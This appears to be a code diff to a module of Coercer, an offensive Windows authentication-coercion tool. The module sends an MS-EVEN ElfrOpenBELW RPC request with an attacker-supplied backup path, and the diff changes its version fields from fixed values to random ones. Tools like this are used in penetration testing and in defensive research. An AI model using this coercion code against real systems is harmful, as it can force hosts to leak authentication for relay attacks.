@@ -5,6 +5,7 @@
 # Date created       : 11 Dec 2022
 
 
+import random
 from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
 from coercer.network.DCERPCSessionError import DCERPCSessionError
 from impacket.dcerpc.v5 import even
@@ -51,8 +52,8 @@ class ElfrOpenBELW(MSPROTOCOLRPCCALL):
                 request = even.ElfrOpenBELW()
                 request['UNCServerName'] = NULL
                 request['BackupFileName'] = self.path
-                request['MajorVersion'] = 1
-                request['MinorVersion'] = 1
+                request['MajorVersion'] = random.randint(0,100)
+                request['MinorVersion'] = random.randint(0,100)
                 resp = dcerpc_session.request(request)
                 resp.dump()
                 return ""
